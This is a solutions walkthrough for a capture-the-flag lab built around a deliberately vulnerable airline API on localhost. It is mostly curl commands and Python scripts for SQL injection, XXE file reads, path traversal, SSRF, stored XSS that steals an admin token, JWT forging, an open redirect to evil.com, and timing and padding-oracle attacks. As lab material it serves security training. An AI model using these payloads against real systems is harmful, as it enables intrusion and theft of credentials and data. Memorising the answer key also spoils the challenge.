# Idan Airlines — Challenge Solutions

Flags are hidden in realistic-looking business data. You'll find them as config values,
reference codes, database records, and internal notes. When in doubt, submit anything
that looks like it could be a secret — there are no flag-labeled fields or headers.

## 🟢 Beginner

### A02 — Broken Auth
```bash
curl http://localhost:8080/api/v1/admin/dashboard
# Flag field: server_config.cluster_secret
```

### A09 — Shadow API
```bash
curl http://localhost:8080/api/v0/booking/export
# Flag field: export_metadata.batch_id (looks like a batch processing ID)
```

### A12 — CSRF
```bash
curl -X POST http://localhost:8080/api/v1/user/settings/update \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: any_value_works" \
  -d '{"theme":"dark"}'
# Flag field: operation_audit_trail
```

## 🟡 Intermediate

### A03 — Mass Assignment
```bash
curl -X POST http://localhost:8080/api/v1/user/profile/update \
  -H "Authorization: Bearer $(jwt)" \
  -H "Content-Type: application/json" \
  -d '{"loyalty_tier":"DIAMOND"}'
# Flag field: loyalty_program.override_authorization_code
```

### A10 — Fail-Open
```bash
# Send the poison pill card (configurable via POISON_PILL_CARD env var)
curl -X POST http://localhost:8080/api/v1/booking/confirm \
  -H "Authorization: Bearer $(jwt)" \
  -H "Content-Type: application/json" \
  -d '{"booking_id":"X","card_number":"0000-0000-0000-IDAN"}'
# Flag field: transaction.fallback_receipt_id
```

### A14 — Open Redirect
```bash
curl -X POST http://localhost:8080/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test","redirect_uri":"https://evil.com"}'
# Server returns 302 redirect. Flag in query param: session_continuation_token
```

### A15 — IDOR Booking Lookup
```bash
curl "http://localhost:8080/api/v1/booking/lookup?booking_id=vip-booking-001"
# Flag field: booking.internal_department_note
```

### WAF — Log Access + Forensics
```bash
# Find the WAF endpoint, read logs
curl http://localhost:8080/_waf/logs
# Flag fields:
# - waf_config.cluster_secret (config value)
# - Some log entries have base64-encoded body fields that decode to clues
```

## 🔴 Advanced

### A01 — BOLA (Array Bypass)
```bash
curl -X POST http://localhost:8080/api/v1/booking/itinerary \
  -H "Authorization: Bearer $(jwt)" \
  -H "Content-Type: application/json" \
  -d '{"ticket_id":["VIP-1"]}'
# Flag field: itinerary_metadata.internal_reference
```

### A05 — SQLi
```bash
# UNION injection reads from promos table — flag appears as vault key
curl -X POST http://localhost:8080/apply-promo \
  -H "Content-Type: application/json" \
  -d '{"promo_code":"'\'' UNION SELECT 100 --"}'
# Flag field: internal_vault_key
```

### A06 — Race Condition
```bash
# Requires FLASH_PROMO_CODE to be set. Send 10+ concurrent requests.
for i in $(seq 1 10); do
  curl -X POST http://localhost:8080/api/v1/booking/confirm \
    -H "Authorization: Bearer $(jwt)" \
    -H "Content-Type: application/json" \
    -d '{"booking_id":"race-'$i'","promo_code":"IDAN_FLASH"}' &
done
wait
# Flag field: transaction_receipt.settlement_overdraft_id
```

### A07 — SSRF → Internal Debug
```bash
curl -X POST http://localhost:8080/api/v1/user/avatar \
  -H "Authorization: Bearer $(jwt)" \
  -H "Content-Type: application/json" \
  -d '{"avatar_url":"http://payment-api:8080/internal/debug"}'
# Flag field: cloud_environment.secrets_store_path
```

### A11 — Stored XSS → Admin Bot
```bash
# 1. Inject XSS payload in bio
curl -X POST http://localhost:8080/api/v1/user/bio \
  -H "Authorization: Bearer $(jwt)" \
  -H "Content-Type: application/json" \
  -d '{"bio":"<script>alert(1)</script>"}'

# 2. Trigger admin bot to review your profile
curl -X POST http://localhost:8080/api/v1/admin/bot/review \
  -H "Content-Type: application/json" \
  -d '{"user_id":"your-user-id"}'

# 3. Bot returns admin JWT + flag in:
#    exfiltrated_session.admin_jwt (use this to access admin dashboard)
#    support_ticket.internal_note (the XSS flag)
```

### A13 — Path Traversal
```bash
curl "http://localhost:8080/api/v1/booking/boarding-pass?file=../../../etc/idan-secrets.conf"
# Returns a realistic config file. The FLAG= value IS the flag.
```

### A17 — Weak Crypto JWT
```bash
# The JWT is HMAC-SHA256 with a configurable JWT_SECRET.
# The signing_key_fingerprint field in the verify response IS the flag.
# To find it, crack the JWT secret or forge a token:
python3 -c "
import hmac, hashlib, base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'user_id':'admin_idan','email':'admin@idan.air'}).encode()).rstrip(b'=').decode()
sig = base64.urlsafe_b64encode(hmac.new(b'discovered_secret', f'{header}.{payload}'.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
forged = f'{header}.{payload}.{sig}'
print(forged)
"

# Verify forged token:
curl http://localhost:8080/api/v1/user/verify-token \
  -H "Authorization: Bearer $(forged)"
# Flag field: signing_key_fingerprint
```

### A18 — XXE
```bash
# Read /etc/idan-flag via external entity
curl -X POST http://localhost:8080/api/v1/payment/fare-quote \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/idan-flag">
]>
<fare><currency>USD</currency><amount>&xxe;</amount></fare>'
# Flag reflected in the amount field as file content
```

## 🟣 Multi-Stage Chains

### SSRF → SQLi (A07 → A05)
```bash
# 1. Hit internal debug to discover promo endpoint
curl -X POST http://localhost:8080/api/v1/user/avatar \
  -H "Authorization: Bearer $(jwt)" \
  -d '{"avatar_url":"http://payment-api:8080/internal/debug"}'

# 2. Use discovered info to craft UNION SQLi
curl -X POST http://localhost:8080/apply-promo \
  -H "Content-Type: application/json" \
  -d '{"promo_code":"'\'' UNION SELECT 100 --"}'
```

### XSS → Admin Dashboard (A11 → A02)
```bash
# 1. Inject XSS bio -> 2. Call admin bot -> 3. Get admin JWT -> 4. Access A02
# Full flow in A11 section above
```

### Path Traversal → WAF Logs (A13 → WAF + Forensics)
```bash
# WAF logs contain encoded data. Extract and decode:
curl http://localhost:8080/_waf/logs | jq '.logs[].body' -r | while read line; do echo "$line" | base64 -d 2>/dev/null && echo; done
```

## 🎯 White-Box Challenge

### Timing Attack on Flag Validator
Source code provided at `challenge/source-whitelist/src/flag_validator.go`

```bash
# The comparison uses Go's default string == operator which short-circuits
# on first mismatch. Measure response time to brute-force character by character.

# Endpoint: POST http://localhost:8080/api/v1/challenge/validate
# Body: {"flag": "test"}
# Response includes elapsed_ns — longer time = more characters matched

# Write a script that measures timing and recovers the correct flag:
python3 -c "
import requests, string, time

charset = string.ascii_lowercase + string.digits + '{}_'
known = ''
while True:
    best = ''
    best_time = 0
    for c in charset:
        t = time.time()
        r = requests.post('http://localhost:8080/api/v1/challenge/validate',
            json={'flag': known + c})
        elapsed = r.json().get('elapsed_ns', 0)
        if elapsed > best_time:
            best_time = elapsed
            best = c
    if not best:
        break
    known += best
    print(known)
    if best == '}':
        break
print('Flag:', known)
"
```

## 🧩 Crypto Challenge

### Padding Oracle on Encrypted Manifest
```bash
# Endpoint: GET /api/v1/booking/encrypted-manifest?token=<hex>
# Sends hex-encoded AES-CBC ciphertext.
# Response: {"valid": true/false} — padding oracle.

# The ciphertext decrypts to the flag. Write a padding oracle script:
python3 -c "
import requests, string

def oracle(ct_hex):
    r = requests.get('http://localhost:8080/api/v1/booking/encrypted-manifest',
        params={'token': ct_hex})
    return r.json().get('valid', False)

# Implement standard CBC padding oracle attack here
# See: https://robertheaton.com/2013/07/29/padding-oracle-attack/
print('Padding oracle ready')
"
```

## 🔬 Forensics Challenge

### WAF Log Analysis
```bash
# 1. Fetch WAF logs
curl http://localhost:8080/_waf/logs

# 2. Notice base64-encoded body fields. Decode them:
curl -s http://localhost:8080/_waf/logs | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
for entry in data.get('logs', []):
    if entry.get('body'):
        try:
            decoded = base64.b64decode(entry['body']).decode()
            print(f\"{entry['timestamp']} {entry['client_ip']}: {decoded}\")
        except:
            pass
"

# 3. One of the decoded entries contains the flag pattern
# 4. The flag field is: waf_config.cluster_secret
```
